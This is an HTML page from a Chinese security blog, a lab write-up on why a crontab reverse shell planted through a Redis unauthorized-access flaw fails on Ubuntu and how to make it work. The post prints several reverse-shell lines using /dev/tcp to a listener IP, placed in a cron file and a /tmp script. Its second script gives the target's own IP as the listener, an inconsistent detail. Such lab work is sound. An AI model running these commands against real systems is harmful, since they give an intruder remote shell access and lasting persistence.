@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Linux," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="解决ubuntu任务计划写shell失败的问题这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才">
+<meta name="keywords" content="Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="解决ubuntu任务计划写shell失败的问题">
+<meta property="og:url" content="http://yoursite.com/2018/08/17/2018-08-17/index.html">
+<meta property="og:site_name" content="Climber">
+<meta property="og:description" content="解决ubuntu任务计划写shell失败的问题这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180817/C1IEiF0k24.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180817/Li4blLb61B.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180817/211iak03He.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/7cHCBagDi3.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/cHI0CEilb8.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/224m4lc376.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/mBK26LkHI7.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/D6b21a44ml.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/cGhdh4gbmF.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/Jhm2mgDdhi.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/cChIDHhm8m.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/6kcc9EHIEj.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/Kcal0c0Be3.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/HHkFmi68jB.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/hDGaFg6CFG.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/fB8kK61H0B.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/cfi3KGBI0d.png?imageslim">
+<meta property="og:updated_time" content="2018-08-17T17:01:51.422Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="解决ubuntu任务计划写shell失败的问题">
+<meta name="twitter:description" content="解决ubuntu任务计划写shell失败的问题这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才">
+<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/180817/C1IEiF0k24.png?imageslim">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/17/2018-08-17/"/>
+
+
+
+
+
+  <title>解决ubuntu任务计划写shell失败的问题 | Climber</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Climber</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">原创文章，未经授权请勿转载</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/17/2018-08-17/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Climber">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/Ironman.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Climber">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">解决ubuntu任务计划写shell失败的问题</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-17T23:01:14+08:00">
+                2018-08-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="解决ubuntu任务计划写shell失败的问题"><a href="#解决ubuntu任务计划写shell失败的问题" class="headerlink" title="解决ubuntu任务计划写shell失败的问题"></a>解决ubuntu任务计划写shell失败的问题</h1><p><strong>这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才解决了该问题，将整个问题的解决过程在这里记录一下~</strong></p>
+<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p><strong>ubuntu16.04桌面版：192.168.0.107，用来任务计划反弹shell的靶机</strong></p>
+<p><strong>kali2.0：192.168.0.106，用来接收ubuntu反弹过来的shell</strong></p>
+<h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><p><strong>事情源自于我利用redis未授权访问漏洞在向<code>ubuntu</code>的<code>/var/spool/cron/crontabs</code>目录下创建任务计划文件去反弹shell时，发现shell并不能反弹到自己的kali上</strong></p>
+<p><strong>任务计划文件<code>/var/spool/cron/crontabs/root</code>内容如下</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180817/C1IEiF0k24.png?imageslim" alt="mark"><br><strong>需要特别注意的一点是这的root文件的权限必须为600，也就是<code>rw-------</code>，否则会出现<code>cron[53948]: (root) INSECURE MODE (mode 0600 expected)</code>的错误，会影响到后面的实验</strong></p>
+<p><strong>但是kali却迟迟接收不到反弹过来的shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180817/Li4blLb61B.png?imageslim" alt="mark"><br><strong>之前在centos上利用的时候并没有出现这种情况，使用ubuntu的时候居然不行，下面我们就来一步步的排查看看到底是什么原因导致的</strong></p>
+<p><strong>首先，咱们先来看一下系统日志</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tail -f /var/<span class="built_in">log</span>/syslog</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180817/211iak03He.png?imageslim" alt="mark"><br><strong>通过系统日志可以看到<code>CRON[55318]: (CRON) info (No MTA installed, discarding output)</code>这一条，我们之所以反弹shell失败，和这句话有着很大的关系，百度了一番后得到这句话的大概意思就是我们任务计划里的命令执行如果出现了错误，ubuntu会将这些错误信息去输出到ubuntu系统的邮件服务器，但是由于ubuntu系统默认没有安装邮件服务器，所以才导致了上面的错误</strong></p>
+<p><strong>通过了上面的信息，可以推断出我们任务计划中的命令执行出现了某种错误，然后ubuntu处理这种错误方式是将错误信息发送到本地的邮件服务器，但是邮件服务器不存在，那么我们要想办法将错误信息重定向到文件里面去看看究竟是命令的什么地方产生了错误，修改任务计划文件为</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * <span class="string">'/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'</span>&gt;/tmp/error.txt 2&gt;&amp;1</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/7cHCBagDi3.png?imageslim" alt="mark"><br><strong>1代表标准输出。2代表标准错误输出，也就是命令执行出现的错误，这里将<code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1</code>执行的标准错误输出重定向到输出流，也就是<code>/tmp/error.txt</code>这个文件中，而不是邮件服务器，然后再看日志就没有刚刚的错误了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cHI0CEilb8.png?imageslim" alt="mark"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh: 1: /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1: not found</div></pre></td></tr></table></figure>
+<p><strong>下面可以看到<code>tmp</code>目录下新生成了一个记录错误信息的文件error.txt,内容如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/224m4lc376.png?imageslim" alt="mark"><br><strong>这条错误的意思说<code>/bin/bash</code>没有被找到，通过错误信息还可以明白一件事情，那就是linux里面的cron中command执行的shell环境是<code>/bin/sh</code>，那我们可以再来看一下ubuntu下的<code>/bin/sh</code>文件究极是一个怎么样的文件</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls -al /bin/sh</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/mBK26LkHI7.png?imageslim" alt="mark"><br><strong>可以看到<code>/bin/sh</code>其实是一个软连接文件(l),类似于windows中的快捷方式，只不过在ubuntu中，<code>/bin/sh</code>这个软连接指向了<code>dash</code>，而我们反弹shell使用的shell环境是<code>bash</code>，所以这一点是反弹出错的根本原因</strong></p>
+<p><strong>那么之前的centos为什么就能成功，下面来看一下centos里面的<code>/bin/sh</code>的指向</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/D6b21a44ml.png?imageslim" alt="mark"><br><strong>可以看到centos中<code>/bin/sh</code>的指向是bash，所以命令执行不会出错</strong></p>
+<p><strong>搞清楚了根本的原因后，来说一下解决的办法，这里有两种解决办法，其中一种解决办法是通过修改ubuntu中<code>/bin/sh</code>的指向，将dash改为bash即可，命令如下</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s -f bash /bin/sh</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cGhdh4gbmF.png?imageslim" alt="mark"><br><strong>可以看到此时<code>/bin/sh</code>以及指向了<code>bash</code>，此时将任务计划里的文件修改为之前反弹shell的命令，可以看到不会再报错了，并且shell成功反弹到了kali上</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/Jhm2mgDdhi.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cChIDHhm8m.png?imageslim" alt="mark"></p>
+<p><strong>下面来说一下第二张解决办法，首先我们先将<code>/bin/sh</code>的指向改回<code>dash</code></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s -f dash /bin/sh</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/6kcc9EHIEj.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/Kcal0c0Be3.png?imageslim" alt="mark"><br><strong>下面来说一下第二种方法，就是避免在cron文件里去使用bash这个shell，我们可以另外的去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用这个shell脚本文件</strong></p>
+<p><strong>shell脚本文件如下，文件名为<code>/tmp/test.sh</code></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.107/7777 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/HHkFmi68jB.png?imageslim" alt="mark"><br><strong>然后为test.sh加上执行权限</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x /tmp/test.sh</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/hDGaFg6CFG.png?imageslim" alt="mark"><br><strong>之后任务计划里的内容修改为</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * /tmp/test.sh</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/fB8kK61H0B.png?imageslim" alt="mark"><br><strong>可以看到kali上成功反弹到了shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cfi3KGBI0d.png?imageslim" alt="mark"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>这一次真的是踩了很多坑，最终才终于弄明白，通过这次的学习使我对linux的认识更加的深刻了，同时也学到了解决问题的思路和方法，在这里十分感谢kakaxi和ttgo2两位大神的帮助！</strong></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/15/redis/" rel="next" title="redis未授权访问漏洞">
+                <i class="fa fa-chevron-left"></i> redis未授权访问漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/Ironman.jpg"
+                alt="Climber" />
+            
+              <p class="site-author-name" itemprop="name">Climber</p>
+              <p class="site-description motion-element" itemprop="description">信息安全技术博客</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.shentoushi.top/index" title="渗透测试师导航" target="_blank">渗透测试师导航</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.lorexxar.cn/" title="LoRexxar's Blog" target="_blank">LoRexxar's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="P牛" target="_blank">P牛</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.4o4notfound.org/" title="404 Not Found'Blog" target="_blank">404 Not Found'Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+          
+
+        </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=524543708&auto=0&height=66"></iframe>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#解决ubuntu任务计划写shell失败的问题"><span class="nav-number">1.</span> <span class="nav-text">解决ubuntu任务计划写shell失败的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境说明"><span class="nav-number">1.0.1.</span> <span class="nav-text">环境说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体过程"><span class="nav-number">1.0.2.</span> <span class="nav-text">具体过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.0.3.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Climber</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
